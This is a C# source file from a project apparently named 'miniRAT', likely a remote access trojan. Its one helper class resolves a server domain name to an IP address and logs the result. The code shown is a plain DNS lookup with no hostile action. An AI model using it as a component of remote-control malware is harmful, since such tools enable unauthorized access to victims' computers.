using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;

namespace miniRAT
{
    /// <summary>
    /// Resolve domain name to ip.
    /// </summary>
    class DomainResolver
    {
        public static IPAddress GetServerIP(string serverDomainName)
        {
            if (IPAddress.TryParse(serverDomainName, out IPAddress serverIP))
                return IPAddress.Parse(serverDomainName);//it's ip not domain
            
            try
            {
                //Use system DNS
                serverIP = Dns.GetHostAddresses(serverDomainName)[0];
                if (serverIP == null)//Resolve fail
                {
                    LogWriter.WriteLog("GetServerIP Resolve fail :(");
                    return null;
                }
            }
            catch (Exception x)
            {
                LogWriter.WriteLog("Error in GetServerIP :( "+x.Message);
                return null;
            }

            LogWriter.WriteLog("Server IP is: " + serverIP.ToString());
            return serverIP;
        }
    }
}
